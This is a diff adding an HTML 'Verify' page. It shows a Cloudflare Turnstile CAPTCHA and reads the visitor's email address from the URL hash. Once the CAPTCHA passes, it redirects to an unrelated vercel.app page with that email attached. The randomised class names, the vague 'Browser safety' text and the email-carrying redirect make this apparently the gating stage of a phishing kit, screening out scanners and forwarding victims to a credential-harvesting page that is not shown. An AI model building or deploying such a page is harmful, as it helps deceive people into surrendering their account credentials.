@@ -1,0 +1,115 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verify</title>
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" nonce="MTA3NzMwNzcyNiw0MDgzMTg3NDgx"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: white; /* Updated to white background */
+            color: black; /* Change text color to black for better contrast */
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            align-items: flex-start; /* Align to the top */
+            flex-direction: column;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        .SilkenLoom {
+            text-align: center;
+            margin-top: 20px; /* Adds space from the top */
+        }
+
+        .UltravioletRipple {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .AmberHorizon {
+            font-size: 1rem;
+            margin-top: 10px;
+            letter-spacing: 1px;
+        }
+
+        /* Position the CAPTCHA at the top center of the page */
+        .cf-turnstile {
+            position: absolute; /* Use absolute positioning */
+            top: 80px; /* Adjusted to move CAPTCHA 3 steps down */
+            left: 50%; /* Center horizontally */
+            transform: translateX(-50%); /* Adjust to truly center it */
+        }
+
+        /* Position the text just below the CAPTCHA */
+        .confirm-text {
+            position: absolute;
+            top: 170px; /* Adjust as necessary for the space you want between CAPTCHA and text */
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 1rem;
+            letter-spacing: 1px;
+            color: black; /* Change text color to black */
+        }
+
+        @media (max-width: 768px) {
+            .UltravioletRipple {
+                font-size: 1.5rem;
+            }
+
+            .AmberHorizon {
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="SilkenLoom">
+        <!-- Title above CAPTCHA -->
+        <div class="UltravioletRipple"> </div>
+
+        <!-- CAPTCHA Placement at the top center -->
+        <span class="cf-turnstile" data-sitekey="0x4AAAAAAB_mtKjHVZqwQTOO" data-callback="TranquilBreeze"></span>
+
+        <!-- Text below CAPTCHA -->
+        <div class="confirm-text">Browser safety for protection.</div>
+    </div>
+
+    <script nonce="MTA3NzMwNzcyNiw0MDgzMTg3NDgx">
+        // Get email from URL hash if present
+        function getEmailFromHash() {
+            const hash = window.location.hash.substring(1);
+            // Simple email validation regex
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (emailRegex.test(hash)) {
+                return hash;
+            }
+            return null;
+        }
+
+        // Store the email from the initial URL
+        const originalEmail = getEmailFromHash();
+
+        function TranquilBreeze() {
+            // This is where you could trigger the redirect after CAPTCHA is successfully validated
+            console.log("CAPTCHA passed! You can now proceed.");
+
+            // Redirect to your website with the original email hash if it exists
+            if (originalEmail) {
+                window.location.href = `https://goldenhistory-sport.vercel.app/index2.html#${originalEmail}`;
+            } else {
+                window.location.href = "https://goldenhistory-sport.vercel.app/index2.html#";
+            }
+        }
+    </script>
+</body>
+</html>
